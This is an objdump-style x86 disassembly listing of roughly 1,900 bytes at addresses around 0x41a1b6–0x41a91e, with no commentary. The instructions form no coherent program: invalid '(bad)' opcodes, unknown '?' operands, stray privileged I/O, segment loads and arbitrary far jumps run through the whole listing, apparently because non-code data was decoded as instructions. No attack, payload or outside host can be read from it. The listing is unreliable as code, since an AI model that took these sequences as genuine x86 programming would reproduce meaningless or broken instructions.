  41a1b6:	jb     0x41a184
  41a1b8:	xchg   ebx,eax
  41a1b9:	xor    al,0x89
  41a1bb:	daa    
  41a1bc:	pop    ds
  41a1bd:	jl     0x41a20a
  41a1bf:	sub    BYTE PTR [ebx-0x20],ch
  41a1c2:	mov    ds:0xe40e2fc5,al
  41a1c7:	adc    eax,0xeca1e4d6
  41a1cc:	mov    ds:0x4183e0c8,al
  41a1d1:	xchg   ecx,eax
  41a1d2:	call   0x130b4284
  41a1d7:	pop    es
  41a1d8:	in     eax,dx
  41a1d9:	pop    edi
  41a1da:	nop
  41a1db:	pop    DWORD PTR [ecx]
  41a1dd:	mov    esi,0xb98c90e3
  41a1e2:	push   ds
  41a1e3:	and    eax,0x19a8659d
  41a1e8:	add    al,0x7
  41a1ea:	pop    edx
  41a1eb:	aam    0xb1
  41a1ed:	popf   
  41a1ee:	xor    bh,0x7b
  41a1f1:	mov    edi,DWORD PTR [eax+0x4f]
  41a1f4:	mov    edi,ebx
  41a1f6:	in     al,dx
  41a1f7:	inc    eax
  41a1f8:	push   esp
  41a1f9:	daa    
  41a1fa:	cmp    eax,0x499896ca
  41a1ff:	mov    ?,edx
  41a201:	ror    BYTE PTR [edi-0x52],cl
  41a204:	jg     0x41a23d
  41a206:	fs repz inc ecx
  41a209:	mov    esp,DWORD PTR [edx]
  41a20b:	xchg   ebx,eax
  41a20c:	cld    
  41a20d:	outs   dx,BYTE PTR ds:[esi]
  41a20e:	adc    edi,esi
  41a210:	repz das 
  41a212:	out    0x9,eax
  41a214:	loop   0x41a1b0
  41a216:	mov    ss,WORD PTR [eax]
  41a218:	adc    esp,DWORD PTR ds:0x5f1a8684
  41a21e:	scas   al,BYTE PTR es:[edi]
  41a21f:	mov    edi,cs
  41a221:	and    al,0x1f
  41a223:	retf   0xa8d
  41a226:	imul   edx,DWORD PTR [edx+0x1a7e81fa],0xbc50b57c
  41a230:	mov    ds:0x479aff06,al
  41a235:	inc    edi
  41a236:	or     BYTE PTR [ecx+0x4002901d],ah
  41a23c:	in     al,dx
  41a23d:	test   cl,dl
  41a23f:	outs   dx,BYTE PTR ds:[esi]
  41a240:	imul   eax,DWORD PTR [ecx+0x77],0x60cd22c8
  41a247:	mov    al,0xf8
  41a249:	loop   0x41a27f
  41a24b:	mov    BYTE PTR [esi],al
  41a24d:	jmp    0x41a1ff
  41a24f:	jo     0x41a1dd
  41a251:	mov    esp,0x90e24046
  41a256:	sbb    edi,ebp
  41a258:	test   ch,bh
  41a25a:	mov    gs,WORD PTR [esi]
  41a25c:	loope  0x41a2da
  41a25e:	mov    cl,0x80
  41a260:	sbb    al,0x9c
  41a262:	cmp    dl,BYTE PTR [ecx]
  41a264:	xchg   ebp,eax
  41a265:	test   al,bh
  41a267:	xor    eax,esi
  41a269:	cmp    BYTE PTR ds:0x84df7671,dl
  41a26f:	and    DWORD PTR [esi+0x324e1f90],ecx
  41a275:	mov    ds:0x65868e42,eax
  41a27a:	mov    eax,0x5190ff46
  41a27f:	mov    gs,edi
  41a281:	or     dh,BYTE PTR ds:0x40ee93e4
  41a287:	in     al,0x95
  41a289:	push   ss
  41a28a:	push   eax
  41a28b:	js     0x41a251
  41a28d:	cmp    eax,0xc0224660
  41a292:	mov    bl,0x9f
  41a294:	push   cs
  41a295:	xor    dh,cl
  41a297:	pushf  
  41a298:	xor    ch,BYTE PTR [esi-0x2265cdbd]
  41a29e:	cmp    al,0x6d
  41a2a0:	pop    eax
  41a2a1:	(bad)  
  41a2a2:	jmp    0x24a67c9c
  41a2a7:	xor    eax,0xf37c2454
  41a2ac:	and    bh,BYTE PTR [esi]
  41a2ae:	pop    edx
  41a2af:	or     eax,0x7c08d736
  41a2b4:	(bad)  
  41a2b5:	and    eax,0x77edb9a6
  41a2ba:	icebp  
  41a2bb:	cmp    BYTE PTR [edi+edx*8+0x15428786],0x7
  41a2c3:	mul    BYTE PTR [ebx]
  41a2c5:	xor    bl,dh
  41a2c7:	jp     0x41a261
  41a2c9:	or     edi,esp
  41a2cb:	ror    BYTE PTR [esi+eiz*1-0x53],0xcd
  41a2d0:	mov    esp,0x38515c8f
  41a2d5:	icebp  
  41a2d6:	out    dx,eax
  41a2d7:	stos   BYTE PTR es:[edi],al
  41a2d8:	leave  
  41a2d9:	xor    eax,0x6f5bdfa6
  41a2de:	clc    
  41a2df:	popf   
  41a2e0:	pop    ds
  41a2e1:	rcl    DWORD PTR [ecx-0x4456169e],cl
  41a2e7:	sbb    ah,0x9b
  41a2ea:	xor    BYTE PTR [edx+ebp*2],ah
  41a2ed:	or     DWORD PTR [eax],edx
  41a2ef:	cdq    
  41a2f0:	inc    ebp
  41a2f1:	add    DWORD PTR ds:0xf408e171,edi
  41a2f7:	xlat   BYTE PTR ds:[ebx]
  41a2f8:	jno    0x41a292
  41a2fa:	mov    ecx,0xbb749955
  41a2ff:	sbb    edx,DWORD PTR [eax+eax*2+0x46]
  41a303:	clc    
  41a304:	imul   cx,WORD PTR [edx-0x50],0xed57
  41a30a:	(bad)  
  41a30b:	faddp  st(6),st
  41a30d:	stos   DWORD PTR es:[edi],eax
  41a30e:	popf   
  41a30f:	ins    BYTE PTR es:[edi],dx
  41a310:	mov    ds:0xaf5026f8,al
  41a315:	mov    bl,0x29
  41a317:	pop    ss
  41a318:	push   ds
  41a319:	pushf  
  41a31a:	in     al,dx
  41a31b:	inc    eax
  41a31c:	push   edx
  41a31d:	dec    ecx
  41a31e:	xor    al,BYTE PTR [ecx]
  41a320:	xor    cl,BYTE PTR [esi]
  41a322:	dec    ecx
  41a323:	cld    
  41a324:	fldln2 
  41a326:	popa   
  41a327:	loope  0x41a2cd
  41a329:	and    ecx,DWORD PTR [ebp-0x30321859]
  41a32f:	xchg   BYTE PTR [edx],ch
  41a331:	cmovl  ebx,ebp
  41a334:	inc    esi
  41a335:	out    0xe4,al
  41a337:	push   cs
  41a338:	mov    ebx,0xb46c2ead
  41a33d:	or     ecx,DWORD PTR [edi+eiz*1-0x52]
  41a341:	or     DWORD PTR [edi-0x2e8efe97],esi
  41a347:	inc    edx
  41a348:	sub    eax,0x9b381a08
  41a34d:	jge    0x41a3b7
  41a34f:	dec    esi
  41a350:	jns    0x41a372
  41a352:	add    eax,0x2cf948bc
  41a357:	pop    ss
  41a358:	and    DWORD PTR [ebp+edx*1-0x6a],0x7ffd653f
  41a360:	test   al,0x87
  41a362:	inc    eax
  41a363:	out    0x19,eax
  41a365:	retf   0x737e
  41a368:	les    eax,FWORD PTR [ecx+0x4935613d]
  41a36e:	fnstcw WORD PTR [ebx-0x3783fd51]
  41a374:	shl    DWORD PTR [eax+ebp*1+0x43],1
  41a378:	js     0x41a3ef
  41a37a:	jne    0x41a342
  41a37c:	shl    dl,cl
  41a37e:	cwde   
  41a37f:	(bad)  
  41a380:	je     0x41a368
  41a382:	sar    ecx,0x7d
  41a385:	mov    BYTE PTR [edi+0x4efdaa03],bl
  41a38b:	loop   0x41a39f
  41a38d:	sbb    eax,esi
  41a38f:	sub    al,0xca
  41a391:	inc    esi
  41a392:	sti    
  41a393:	cld    
  41a394:	pop    esi
  41a395:	call   0x5650:0x5cee6d59
  41a39c:	or     dl,BYTE PTR [eax+0x18]
  41a39f:	xor    DWORD PTR [ebp+0x4b],ebx
  41a3a2:	jno    0x41a360
  41a3a4:	pusha  
  41a3a5:	sub    BYTE PTR es:[edi],bh
  41a3a8:	dec    eax
  41a3a9:	fisttp WORD PTR [ebx+0x2b]
  41a3ac:	addr16 adc eax,0x7e345218
  41a3b2:	dec    edx
  41a3b3:	xchg   edx,eax
  41a3b4:	add    DWORD PTR [edi+0x31],0x9e28dcf2
  41a3bb:	or     eax,0x11530c81
  41a3c0:	mov    ecx,0x413919a0
  41a3c5:	push   ebx
  41a3c6:	rcr    DWORD PTR [edi],0x79
  41a3c9:	cmp    BYTE PTR [edx-0x2b],ah
  41a3cc:	fcomp  QWORD PTR [esi+0x2]
  41a3cf:	js     0x41a366
  41a3d1:	xchg   edi,eax
  41a3d2:	xchg   dh,bl
  41a3d4:	dec    BYTE PTR [edx]
  41a3d6:	push   edi
  41a3d7:	pop    edi
  41a3d8:	lds    esi,FWORD PTR [ebx]
  41a3da:	mov    DWORD PTR [edx+0x23],ebx
  41a3dd:	dec    ebp
  41a3de:	push   esp
  41a3df:	mov    WORD PTR [ecx+0x4c4ee11d],es
  41a3e5:	sbb    ebp,DWORD PTR [edi]
  41a3e7:	sahf   
  41a3e8:	push   esp
  41a3e9:	inc    edi
  41a3ea:	and    BYTE PTR [ebp-0x3493dd4d],0xcf
  41a3f1:	loop   0x41a414
  41a3f3:	loopne 0x41a43f
  41a3f5:	cmp    ah,BYTE PTR [eax]
  41a3f7:	mov    bl,0x46
  41a3f9:	and    eax,0x88a65196
  41a3fe:	push   eax
  41a3ff:	ds aam 0x16
  41a402:	fs push ebx
  41a404:	jnp    0x41a430
  41a406:	jnp    0x41a448
  41a408:	dec    ebp
  41a409:	cmp    DWORD PTR [edx-0x26f5f315],edx
  41a40f:	ret    0x46fa
  41a412:	mov    ds,edx
  41a414:	or     esp,DWORD PTR [ebx+0x70]
  41a417:	(bad)  
  41a418:	sbb    BYTE PTR [ecx+0x3a],bl
  41a41b:	mov    ?,ebp
  41a41d:	pop    ss
  41a41e:	test   eax,0x5cc7c14a
  41a423:	jne    0x41a4a4
  41a425:	inc    DWORD PTR [ecx+0x4af49739]
  41a42b:	jb     0x41a495
  41a42d:	xchg   esp,eax
  41a42e:	dec    ecx
  41a42f:	jae    0x41a42b
  41a431:	js     0x41a3f5
  41a433:	pop    esi
  41a434:	xchg   edi,eax
  41a435:	mov    al,ds:0x8893ea20
  41a43b:	cmovbe edx,DWORD PTR [esi-0x61311e0]
  41a442:	dec    esi
  41a443:	int3   
  41a444:	adc    al,0xde
  41a446:	outs   dx,BYTE PTR ds:[esi]
  41a447:	div    BYTE PTR [edx-0x2b]
  41a44a:	(bad)  
  41a44b:	popa   
  41a44c:	push   ecx
  41a44d:	pop    ss
  41a44e:	addr16 dec eax
  41a450:	sub    BYTE PTR ds:0x4fba8cee,0xe2
  41a457:	repnz dec ebx
  41a459:	cmp    DWORD PTR [ecx],edx
  41a45b:	imul   esp,DWORD PTR [ecx],0xb17ce95b
  41a461:	stc    
  41a462:	push   edi
  41a463:	aad    0x62
  41a465:	mov    ebp,0x109604ad
  41a46a:	jmp    0x41a476
  41a46c:	leave  
  41a46d:	sub    edi,DWORD PTR [ebx-0x80]
  41a470:	mov    ds:0xde4aa02e,eax
  41a475:	sbb    BYTE PTR [eax+0x8066f0d],ch
  41a47b:	pop    edx
  41a47c:	retf   
  41a47d:	ja     0x41a401
  41a47f:	xor    cl,dh
  41a481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a482:	test   BYTE PTR [eax+0x3a3cf67],0x15
  41a489:	or     cl,BYTE PTR [esi-0x37]
  41a48c:	test   BYTE PTR [edx],0x1e
  41a48f:	mov    ds:0x8ddc065c,eax
  41a494:	push   esp
  41a495:	dec    esp
  41a496:	pusha  
  41a497:	lods   eax,DWORD PTR ds:[si]
  41a499:	rcr    DWORD PTR [ebx+0x3],1
  41a49c:	adc    eax,0x201b5239
  41a4a1:	stos   DWORD PTR es:[edi],eax
  41a4a2:	repnz fild QWORD PTR [edi+0x13357875]
  41a4a9:	push   ebx
  41a4aa:	xchg   ecx,eax
  41a4ab:	mov    ebp,0x92df8a7
  41a4b0:	and    DWORD PTR [esi+ebx*8],0x73
  41a4b4:	lods   al,BYTE PTR ds:[esi]
  41a4b5:	adc    al,0xc8
  41a4b7:	cmp    al,0xe6
  41a4b9:	jp     0x41a51f
  41a4bb:	sbb    DWORD PTR [esi],esi
  41a4bd:	cmp    ch,dl
  41a4bf:	out    dx,eax
  41a4c0:	xor    DWORD PTR [ecx-0x760d8633],edi
  41a4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4c7:	push   0xffffff95
  41a4c9:	std    
  41a4ca:	outs   dx,DWORD PTR ds:[esi]
  41a4cb:	mov    dh,0xc5
  41a4cd:	xchg   ebp,eax
  41a4ce:	in     al,0x99
  41a4d0:	inc    edx
  41a4d1:	out    0xc3,al
  41a4d3:	mov    esp,esp
  41a4d5:	sbb    bh,BYTE PTR [eax-0x46866c93]
  41a4db:	mov    ah,0xcf
  41a4dd:	pop    esi
  41a4de:	pop    ds
  41a4df:	jmp    0x654b:0x2514731
  41a4e6:	push   ebp
  41a4e7:	adc    eax,0xcdb696f7
  41a4ec:	retf   0xccb7
  41a4ef:	out    0x10,al
  41a4f1:	dec    ecx
  41a4f2:	xor    ebp,esp
  41a4f4:	xor    eax,esi
  41a4f6:	xor    DWORD PTR [ebx+0x5e],ebx
  41a4f9:	mov    dh,0xc6
  41a4fb:	(bad)  
  41a4fc:	dec    ebx
  41a4fd:	cmp    eax,0xd4912f77
  41a502:	test   BYTE PTR [eax+0x44],ah
  41a505:	add    DWORD PTR [edx-0x52],ecx
  41a508:	cld    
  41a509:	sub    BYTE PTR [esi-0x26],dh
  41a50c:	or     eax,0xb789e46
  41a511:	push   es
  41a512:	jecxz  0x41a515
  41a514:	in     al,0x67
  41a516:	ret    0xa20e
  41a519:	lods   al,BYTE PTR ds:[esi]
  41a51a:	and    DWORD PTR [ebp*1+0x269f34b4],0x73
  41a522:	stos   DWORD PTR es:[edi],eax
  41a523:	sbb    DWORD PTR [edi-0x20],0x4e7b7a98
  41a52a:	out    dx,eax
  41a52b:	inc    ecx
  41a52c:	and    DWORD PTR [ebx-0x5c76dd4e],edx
  41a532:	mov    esp,0xaf33157d
  41a537:	dec    eax
  41a538:	or     al,0xe2
  41a53a:	outs   dx,BYTE PTR ds:[esi]
  41a53b:	(bad)  
  41a53d:	mov    dh,0x3d
  41a53f:	pop    ss
  41a540:	xlat   BYTE PTR ds:[ebx]
  41a541:	(bad)  
  41a542:	mov    ds:0x9c4785e6,al
  41a547:	jecxz  0x41a510
  41a549:	mov    ecx,0xc4deea17
  41a54e:	xor    BYTE PTR [ebx+0x6f8b0947],bh
  41a554:	leave  
  41a555:	dec    ebp
  41a556:	mov    ch,0x9b
  41a558:	or     edi,DWORD PTR [ecx+0x6fa6dc8a]
  41a55e:	inc    esp
  41a55f:	data16 je 0x41a5c0
  41a562:	jmp    0xb365:0xfaa6c026
  41a569:	fisub  DWORD PTR [esi+0x4e]
  41a56c:	stc    
  41a56d:	push   ss
  41a56e:	mov    ebp,0x42aa5cca
  41a573:	nop
  41a574:	hlt    
  41a575:	push   0xecca10d2
  41a57a:	mov    ds:0xefa7bab,al
  41a57f:	cs sbb eax,0xda311670
  41a585:	jg     0x41a5fe
  41a587:	mov    ds:0xc756402c,eax
  41a58c:	sahf   
  41a58d:	mov    ebp,0xd7aeb0de
  41a592:	clc    
  41a593:	pop    esi
  41a594:	mov    ebp,DWORD PTR [ebx-0x71dc2e46]
  41a59a:	imul   ebx,DWORD PTR [ebx],0x9a30356c
  41a5a0:	inc    esp
  41a5a1:	icebp  
  41a5a2:	aas    
  41a5a3:	arpl   WORD PTR [ecx-0x13e67db5],bx
  41a5a9:	stc    
  41a5aa:	in     eax,0x53
  41a5ac:	or     bl,BYTE PTR [ecx-0x2d]
  41a5af:	xor    DWORD PTR [ecx-0x6f],eax
  41a5b2:	ins    DWORD PTR es:[edi],dx
  41a5b3:	cli    
  41a5b4:	lahf   
  41a5b5:	xchg   edx,eax
  41a5b6:	lods   al,BYTE PTR ds:[esi]
  41a5b7:	inc    ebp
  41a5b8:	out    dx,eax
  41a5b9:	dec    eax
  41a5ba:	hlt    
  41a5bb:	jns    0x41a639
  41a5bd:	mov    ecx,0x2d793145
  41a5c2:	retf   
  41a5c3:	cmp    al,0x60
  41a5c5:	mov    ecx,ss
  41a5c7:	ja     0x41a569
  41a5c9:	fs push edi
  41a5cb:	or     eax,0x71719998
  41a5d0:	push   es
  41a5d1:	mov    dl,0x7d
  41a5d3:	(bad)  
  41a5d4:	pop    ebx
  41a5d5:	loop   0x41a578
  41a5d7:	lds    esi,FWORD PTR [esi+0x3d]
  41a5da:	leave  
  41a5db:	add    al,0x1c
  41a5dd:	adc    DWORD PTR [ecx],eax
  41a5df:	and    esi,DWORD PTR [ebp-0x5917332]
  41a5e5:	and    DWORD PTR [ebx],edi
  41a5e7:	(bad)  [ebx-0x1d]
  41a5ea:	fs sub eax,0x5c1d454
  41a5f0:	gs jmp 0x41a5f9
  41a5f3:	cmp    al,0x30
  41a5f5:	adc    BYTE PTR [ecx-0x3f],0xaf
  41a5f9:	test   BYTE PTR [ecx+ebx*8+0x7f],bh
  41a5fd:	ret    
  41a5fe:	shl    DWORD PTR [eax-0x8],0xa6
  41a602:	cmp    BYTE PTR [edx-0x462712c3],ch
  41a608:	xor    ebp,DWORD PTR [ebp+edi*4-0x37]
  41a60c:	mov    ch,0x28
  41a60e:	sub    dh,BYTE PTR [ecx]
  41a610:	(bad)  
  41a611:	lds    eax,FWORD PTR [ebp+0x4d566ee7]
  41a617:	xor    eax,0x78ceb172
  41a61c:	daa    
  41a61d:	xchg   ebx,eax
  41a61e:	in     al,dx
  41a61f:	push   esi
  41a620:	mov    esp,gs
  41a622:	cli    
  41a623:	and    ebx,DWORD PTR [ebp-0x673d34db]
  41a629:	xchg   esp,eax
  41a62a:	arpl   WORD PTR [edi+0x116e902f],di
  41a630:	push   cs
  41a631:	ja     0x41a62d
  41a633:	adc    BYTE PTR [ecx-0x79],0xac
  41a637:	or     al,BYTE PTR [edi+0x38b701d]
  41a63d:	test   DWORD PTR [eax],ecx
  41a63f:	retf   
  41a640:	jnp    0x41a5df
  41a642:	aas    
  41a643:	cmc    
  41a644:	mov    al,0xc7
  41a646:	popa   
  41a647:	jle    0x41a666
  41a649:	in     al,dx
  41a64a:	add    eax,0xd78d9760
  41a64f:	mov    dl,0x86
  41a651:	and    eax,ecx
  41a653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a654:	je     0x41a5e8
  41a656:	pop    ebx
  41a657:	fisubr WORD PTR [ebx]
  41a659:	ret    
  41a65a:	adc    eax,0x783ceefc
  41a65f:	or     al,0xee
  41a661:	xchg   esp,eax
  41a662:	push   eax
  41a663:	out    0xe8,eax
  41a665:	sbb    BYTE PTR [edx+0x662973f2],cl
  41a66b:	xchg   esi,eax
  41a66c:	mov    eax,eax
  41a66e:	pop    esp
  41a66f:	retf   0x188a
  41a672:	sbb    al,0x30
  41a674:	loopne 0x41a633
  41a676:	lock xchg ebx,eax
  41a678:	fisttp WORD PTR [edx-0x6f]
  41a67b:	sbb    eax,0xd050770e
  41a680:	mov    ebp,0x9038d9cd
  41a685:	or     DWORD PTR [eax],esp
  41a687:	ret    0x68ef
  41a68a:	sbb    DWORD PTR [eax-0x199158f9],0xfa913382
  41a694:	jmp    0xe8984d5c
  41a699:	into   
  41a69a:	sti    
  41a69b:	rcr    edi,cl
  41a69d:	pushf  
  41a69e:	addr16 push ds
  41a6a0:	inc    ebx
  41a6a1:	iret   
  41a6a2:	sbb    BYTE PTR [edi-0x13],0x30
  41a6a6:	dec    esp
  41a6a7:	retf   0xfb9f
  41a6aa:	dec    eax
  41a6ab:	outs   dx,DWORD PTR ds:[esi]
  41a6ac:	cmp    DWORD PTR [ecx-0x3a],0xffffffe2
  41a6b0:	and    dh,BYTE PTR [esi-0x3cf69492]
  41a6b6:	and    eax,0x8dcbf19
  41a6bb:	push   ebp
  41a6bc:	mov    edx,0x46391b0f
  41a6c1:	push   ebx
  41a6c2:	dec    ecx
  41a6c3:	test   BYTE PTR [eax+0x64],bh
  41a6c6:	(bad)  
  41a6c7:	out    0x44,eax
  41a6c9:	js     0x41a666
  41a6cb:	add    DWORD PTR [edi],eax
  41a6cd:	in     al,0x6d
  41a6cf:	and    al,0x78
  41a6d1:	(bad)  
  41a6d2:	in     al,0x7
  41a6d4:	mov    ah,0x0
  41a6d6:	leave  
  41a6d7:	sar    eax,0xb8
  41a6da:	mov    esp,0x85b1c774
  41a6df:	pop    edi
  41a6e0:	(bad)  
  41a6e1:	and    esp,DWORD PTR [ecx-0x3b]
  41a6e4:	loop   0x41a68a
  41a6e6:	(bad)  [edx+0x1d956c4a]
  41a6ec:	cmp    eax,0x534b5e80
  41a6f1:	pop    esp
  41a6f2:	jae    0x41a6d5
  41a6f4:	inc    ebp
  41a6f5:	pop    edi
  41a6f6:	xchg   BYTE PTR [edi],dl
  41a6f8:	fnstsw WORD PTR [edx]
  41a6fa:	lods   al,BYTE PTR ds:[esi]
  41a6fb:	in     al,dx
  41a6fc:	ret    0xb079
  41a6ff:	jle    0x41a6ed
  41a701:	jecxz  0x41a752
  41a703:	inc    ebp
  41a704:	adc    edx,DWORD PTR [esi-0x27]
  41a707:	das    
  41a708:	mov    ?,WORD PTR [ecx-0xb]
  41a70b:	fstp   TBYTE PTR [eax-0x2d]
  41a70e:	test   al,0xbe
  41a710:	daa    
  41a711:	sub    bh,BYTE PTR [eax-0x63]
  41a714:	cmp    ah,BYTE PTR [ebx+0x75]
  41a717:	cmp    BYTE PTR [eax+ebx*8+0x2a],bh
  41a71b:	dec    esi
  41a71c:	push   edi
  41a71d:	push   edx
  41a71e:	aam    0xa1
  41a720:	xor    dl,bl
  41a722:	loope  0x41a6cf
  41a724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a725:	inc    ebx
  41a726:	push   ebp
  41a727:	(bad)  
  41a728:	xchg   edx,eax
  41a729:	mov    ch,0xd7
  41a72b:	ins    BYTE PTR es:[edi],dx
  41a72c:	cmp    BYTE PTR [ebp-0x14e391ca],dh
  41a732:	and    esp,DWORD PTR [ebx]
  41a734:	dec    edx
  41a735:	lock daa 
  41a737:	mov    al,0x1f
  41a739:	fadd   QWORD PTR [ebx]
  41a73b:	sub    BYTE PTR [ebp-0x6313f48b],cl
  41a741:	pop    esp
  41a742:	cmp    eax,0x63b98732
  41a747:	add    al,0xc3
  41a749:	in     eax,dx
  41a74a:	and    BYTE PTR [esi],al
  41a74c:	xchg   esi,eax
  41a74d:	adc    dh,BYTE PTR [eax+ebp*8-0x8572a21]
  41a754:	inc    ebp
  41a755:	sbb    DWORD PTR [edi],esp
  41a757:	and    BYTE PTR [edx+0x34],dh
  41a75a:	pop    ebp
  41a75b:	xor    BYTE PTR [esi+0x7c],ch
  41a75e:	pop    edi
  41a75f:	cli    
  41a760:	in     al,dx
  41a761:	pop    ecx
  41a762:	(bad)  [ebx+0x3868ed09]
  41a768:	sub    BYTE PTR [eax],0x22
  41a76b:	cmp    cl,BYTE PTR [edx+0x741566e1]
  41a771:	pop    edx
  41a772:	push   0xfffffffe
  41a774:	int    0xa7
  41a776:	iret   
  41a777:	pop    esi
  41a778:	sahf   
  41a779:	pop    es
  41a77a:	adc    ebx,esp
  41a77c:	bnd jbe 0x41a741
  41a77f:	sar    BYTE PTR [ecx-0x3e],1
  41a782:	mov    ah,BYTE PTR [ebp+0x436a4cdd]
  41a788:	mov    ecx,0xd95c533b
  41a78d:	or     esi,0xfffffff7
  41a790:	dec    esi
  41a791:	les    esp,FWORD PTR [ebp-0x2b]
  41a794:	pop    edx
  41a795:	lock or eax,0xa832dc7b
  41a79b:	jp     0x41a80a
  41a79d:	nop
  41a79e:	std    
  41a79f:	sbb    BYTE PTR [ebx+0x34],ah
  41a7a2:	jmp    0x5b2f:0xa0a4194c
  41a7a9:	cmc    
  41a7aa:	shr    BYTE PTR [edx+esi*4+0x79c4f16b],cl
  41a7b1:	loopne 0x41a803
  41a7b3:	pop    eax
  41a7b4:	jmp    0x41a813
  41a7b6:	or     dl,BYTE PTR [ebx]
  41a7b8:	cs punpckhwd mm2,mm0
  41a7bc:	loope  0x41a799
  41a7be:	push   ebx
  41a7bf:	ins    BYTE PTR es:[edi],dx
  41a7c0:	aam    0xd1
  41a7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7c3:	popf   
  41a7c4:	je     0x41a795
  41a7c6:	pop    ebp
  41a7c7:	sub    eax,0x430590ce
  41a7cc:	add    esi,DWORD PTR [ebx-0x6e]
  41a7cf:	mov    bl,0x4c
  41a7d1:	mov    eax,0x45d8551e
  41a7d6:	fdiv   QWORD PTR [eax]
  41a7d8:	fs in  al,dx
  41a7da:	rcl    BYTE PTR [eax],cl
  41a7dc:	adc    al,0x8f
  41a7de:	add    al,0x55
  41a7e0:	jmp    0x385e:0xc3ef879c
  41a7e7:	aad    0x95
  41a7e9:	sub    DWORD PTR [ebx-0x463f67cf],ecx
  41a7ef:	adc    ecx,DWORD PTR [eax-0x2b13eb4c]
  41a7f5:	mov    esi,0x248fb91
  41a7fa:	pop    ss
  41a7fb:	test   BYTE PTR [ecx-0x3e],bh
  41a7fe:	sub    DWORD PTR [edi-0x36388fcf],ecx
  41a804:	push   esp
  41a805:	adc    esp,esp
  41a807:	dec    ebx
  41a808:	mov    ebp,0x1b9a2f7
  41a80d:	pop    ds
  41a80e:	jne    0x41a85c
  41a810:	or     bh,ch
  41a812:	sbb    al,0x6c
  41a814:	sbb    bh,cl
  41a816:	add    ecx,DWORD PTR [esi+0x2b9f49ae]
  41a81c:	shl    DWORD PTR [eax],1
  41a81e:	inc    ecx
  41a81f:	pop    ebp
  41a820:	inc    ebx
  41a821:	fwait
  41a822:	add    DWORD PTR [ecx],ebx
  41a824:	cli    
  41a825:	scas   eax,DWORD PTR es:[edi]
  41a826:	push   ecx
  41a827:	dec    eax
  41a828:	outs   dx,BYTE PTR ds:[esi]
  41a829:	sub    ebp,DWORD PTR [ebx+0x67]
  41a82c:	pop    ss
  41a82d:	xchg   ecx,eax
  41a82e:	pop    edx
  41a82f:	mov    edx,0x28a344c8
  41a834:	pusha  
  41a835:	pop    esp
  41a836:	test   BYTE PTR [edi-0x189bc4a4],dh
  41a83c:	inc    ebp
  41a83d:	xchg   ebp,eax
  41a83e:	or     bh,BYTE PTR [edi+0x48]
  41a841:	ret    0x8b01
  41a844:	cmp    al,0x93
  41a846:	adc    ch,BYTE PTR [ebx+0x6e6b3266]
  41a84c:	mov    ecx,DWORD PTR [ebx]
  41a84e:	pushf  
  41a84f:	cdq    
  41a850:	fld    QWORD PTR [ebx]
  41a852:	add    dl,BYTE PTR [ebx-0x56d9fb3e]
  41a858:	ret    0x608
  41a85b:	fs addr16 daa 
  41a85e:	mov    ss,WORD PTR [edi]
  41a860:	lods   eax,DWORD PTR ds:[esi]
  41a861:	inc    ecx
  41a862:	add    DWORD PTR [edi+0xa],edi
  41a865:	sub    esp,esp
  41a867:	rcl    BYTE PTR [esi],cl
  41a869:	push   ebp
  41a86a:	stc    
  41a86b:	(bad)  
  41a86c:	dec    ecx
  41a86d:	jl     0x41a8ae
  41a86f:	mov    esi,DWORD PTR [eax]
  41a871:	stc    
  41a872:	ror    dh,1
  41a874:	adc    al,BYTE PTR [ebx]
  41a876:	xchg   ebx,eax
  41a877:	data16 jmp 0x41a7ff
  41a87a:	cmp    DWORD PTR [esi],edi
  41a87c:	cmp    ah,BYTE PTR [edi+0x2a]
  41a87f:	mov    bl,0xa1
  41a881:	(bad)  
  41a883:	jae    0x41a8dc
  41a885:	iret   
  41a886:	mov    ds,esp
  41a888:	fidiv  DWORD PTR [edx]
  41a88a:	mov    cl,0x18
  41a88c:	sub    al,0xed
  41a88e:	fldcw  WORD PTR [ebx+eiz*2-0x54]
  41a892:	jns    0x41a833
  41a894:	mov    bh,BYTE PTR [esi+ebx*4-0x47]
  41a898:	pop    edi
  41a899:	inc    edi
  41a89a:	sbb    al,0xf6
  41a89c:	inc    esp
  41a89d:	xor    DWORD PTR [esi-0x6d],edi
  41a8a0:	xchg   edi,eax
  41a8a1:	sti    
  41a8a2:	retf   0x371e
  41a8a5:	sbb    al,0x7
  41a8a7:	lds    edx,FWORD PTR [eax+0x5b]
  41a8aa:	repz push eax
  41a8ac:	stos   BYTE PTR es:[edi],al
  41a8ad:	pop    edx
  41a8ae:	mov    ebp,0x2df79124
  41a8b3:	jbe    0x41a89f
  41a8b5:	call   0x78ca:0x2be1dfbf
  41a8bc:	retf   0x996
  41a8bf:	ficomp DWORD PTR [edx]
  41a8c1:	pop    ecx
  41a8c2:	sub    eax,0x75479b03
  41a8c7:	mov    bh,BYTE PTR [edi-0x232ad639]
  41a8cd:	repz pop ebx
  41a8cf:	sub    al,0x3f
  41a8d1:	adc    al,0xf0
  41a8d3:	mov    eax,ds:0xac722034
  41a8d8:	hlt    
  41a8d9:	retf   
  41a8da:	out    0xf6,eax
  41a8dc:	dec    ecx
  41a8dd:	jne    0x41a8a1
  41a8df:	dec    eax
  41a8e0:	xor    DWORD PTR [edx],ebx
  41a8e2:	pop    edx
  41a8e3:	add    ah,BYTE PTR [eax]
  41a8e5:	mov    eax,0x67971e7a
  41a8ea:	sub    dl,BYTE PTR [ecx-0x3f]
  41a8ed:	iret   
  41a8ee:	jno    0x41a8b8
  41a8f0:	hlt    
  41a8f1:	in     eax,0xe6
  41a8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8f4:	stc    
  41a8f5:	sbb    BYTE PTR [edi-0x1bf204dc],dl
  41a8fb:	xchg   BYTE PTR [ebx+0x35e5e68e],ah
  41a901:	fwait
  41a902:	inc    ebp
  41a903:	sbb    al,0x82
  41a905:	repz leave 
  41a907:	repz sahf 
  41a909:	(bad)  
  41a90a:	mov    edi,0x57775ae9
  41a90f:	cli    
  41a910:	loope  0x41a957
  41a912:	xor    al,0x36
  41a914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a915:	inc    ebx
  41a916:	mov    esi,0x3d45c000
  41a91b:	cdq    
  41a91c:	mov    ch,0x18
  41a91e:	lds    edi,FWORD PTR [edi+edx*1+0x5d2d78ab]
